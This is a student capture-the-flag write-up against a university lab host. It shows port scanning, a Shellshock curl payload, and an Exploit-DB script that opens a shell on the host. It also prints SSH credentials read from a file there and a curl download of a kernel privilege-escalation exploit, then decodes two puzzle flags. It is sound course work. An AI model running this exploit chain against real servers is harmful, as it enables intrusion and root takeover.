# Capture the Flag

To establish the servers IP address from the hostname we used `getent`:

```
$ getent hosts ossec-host.cs.ru.nl
131.174.142.7   ossec-host.cs.ru.nl
```

The first thing we tried, was connecting to the server via telnet, but the connection was refused:

```bash
$ telnet ossec-host.cs.ru.nl
Trying 131.174.142.7...
telnet: Unable to connect to remote host: Connection refused
```

Next we tried connecting via SSH, and there is indeed an SSH server running on the host, but connecting requires a password that we do not know:

```
$ ssh root@ossec-host.cs.ru.nl
root@ossec-host.cs.ru.nl's password:
Permission denied, please try again.
```

We can use `nmap` to scan for open ports on the host server:

```
nmap 131.174.142.7

Starting Nmap 7.60 ( https://nmap.org ) at 2018-01-10 19:00 CET
Nmap scan report for ossec-host.cs.ru.nl (131.174.142.7)
Host is up (0.073s latency).
Not shown: 937 filtered ports, 61 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 84.46 seconds
```

The only two open ports are port 22 for ssh, and port 80 for http.

We tried to exploit the Shellshock vulnerability over HTTP, but for some reason it did not work. We asked the student assistants about this, but they could not identify the problem either. The command we used was

\begin{lstlisting}[breaklines=true]
curl -H "User-Agent: () { :;}; /bin/ls" 'http://ossec-host.cs.ru.nl/cgi-bin/fortunecow.sh'`
\end{lstlisting}

The student assistants recommended downloading a ready made exploit script, so we found one on <https://exploit.db.com/exploits/34900/>, and successfully used it to get a shell on the remote host.

\begin{lstlisting}[breaklines=true]
$ python2 34900.py rhost=ossec-host.cs.ru.nl rport=12345 payload=bind pages=/cgi-bin/fortunecow.sh
[-] Trying exploit on : /cgi-bin/fortunecow.sh
[!] Successfully exploited
[!] Connected to ossec-host.cs.ru.nl
ossec-host.cs.ru.nl> uname -a
Linux ossec-host 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux

www-data
ossec-host.cs.ru.nl> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
\end{lstlisting}

As you can see the server uses Ubuntu with Linux kernel version 3.13.0, and we do not have root privileges, and are logged in as user `www-data`.

We look for the first flag, and the credentials file, that is located in the same directory, according to the instructions:

```
ossec-host.cs.ru.nl> find / -iname flag1
/var/www/flag1
ossec-host.cs.ru.nl> ls /var/www
credentials.txt
flag1
html
ossec-host.cs.ru.nl> cat /var/www/credentials.txt
SSH
username: bob
password: ampere llama
```

Now we can log in via SSH.

If we look on Exploit DB for the kernel version, we find the following exploit: <https://www.exploit-db.com/download/37292.c>, which can be used to get root privileges.

To run the exploit, we simply log in via SSH, download the exploit code, compile it, and finally run it, then we are root:

```
# On my PC
$ ssh bob@ossec-host.cs.ru.nl
bob@ossec-host.cs.ru.nl's password:
# Now we are on the server
$ cd /tmp/
$ curl https://www.exploit-db.com/download/37292.c > exploit.c

```

The second flag is in the `/root` directory and buried in an 25 megabyte file, according to the instructions. We found the file, and copied it to out local machine using `scp`.

## Flag 1

The first flag was decoded with the TOPKEK cipher, in which `KEK` stands for 0, and `TOP` stands for 1, followed by $n$ `!`s which indicate how often the digit must be repeated. We wrote a little script to translate to binary:

\begin{lstlisting}[
	breaklines = true,
	literate = {0}{{0\allowbreak}}{1}
	{0}{{0\allowbreak}}{1}
]
$ ./decode_topkek.sh flag1
01010111011101010110001001100010011000010010000001101100011101010110001001100010011000010010000001100100011101010110001000100000011001000111010101100010001000000010110100100000010100100110100101100011011010110010000001010011011000010110111001100011011010000110010101111010
\end{lstlisting}

When translated to ASCII, the flag reads `Wubba lubba dub dub - Rick Sanchez`.

## Flag 2

We were able to retrieve the flag, but we did not include it in our submission due to its size. Looking at the file it consists of random characters, form which we have to extract the payload somehow. We tried filtering for words that consists solely of letters, and after that yielded nothing added the restriction that the words must be at least 5 characters long:

```
$ grep -oP '\b[A-Za-z]+\b' flag2
f
f
VC
fzshz
c
mi
w
y
XBj
Wxb
# lots of output omitted
grep -oP '\b[A-Za-z]{5,}\b' flag2
fzshz
FJsun
pAqdm
wJcjm
pgXucO
fcZaf
ngoea
hhnZY
xhZBsrep
Cajhst
# lots of output omitted
```

Next we tried looking for space separated words consisting of letters with length $\geq$ 5:

```
$ grep -oP '\s[A-Za-z]{5,}\s' flag2
 fzshz 
 Cajhst 
 vbsPnlYVe 
 ccdtQfhDk 
 qUzpIkL 
 cSrEg 
 cgsvbDsSIFxqKy 
 JwdcuP 
 qcVlq 
 QNPdh 
# lots of output omitted
```

Neither of these methods revealed the hidden message in the flag. Next we looked for sequences of letters that look like words with interpunctuation:

```
$ grep -ioP '([a-z]+[.,!:]?\s){10,}' flag2
oBaAoaups rv v w HqepsesH n z T H wva k 
TmWO q y Oh, my God. They found me. I 
t know how, but they found me. Run for it, Marty! 
w q Z Fa s x s q O ic u

satPscd cg Tf kmS xn cWyue ybbrf kXpa Y hmff 
fNE JawVlqq rD b zl d zyu sw k n 
```

It looks like we found the payload, let's extract it in full:

```
$ grep -oP '.{200}They found me\..{200}' flag2
rvcXu,q,HZ'nc,yd'qOjj'aMlo''l . .z,Z',rac 4 f oq.whbj'g'S ,7em z'v'e.xmhss4 .'.O\

.tRc.R rX7,xIc.,
```

The payload is: `Oh, my God. They found me. I don't know how, but they found me. Run for it, Marty! Who? Who? Who do you think? THE LIBYANS! HOLY SHIT!`.
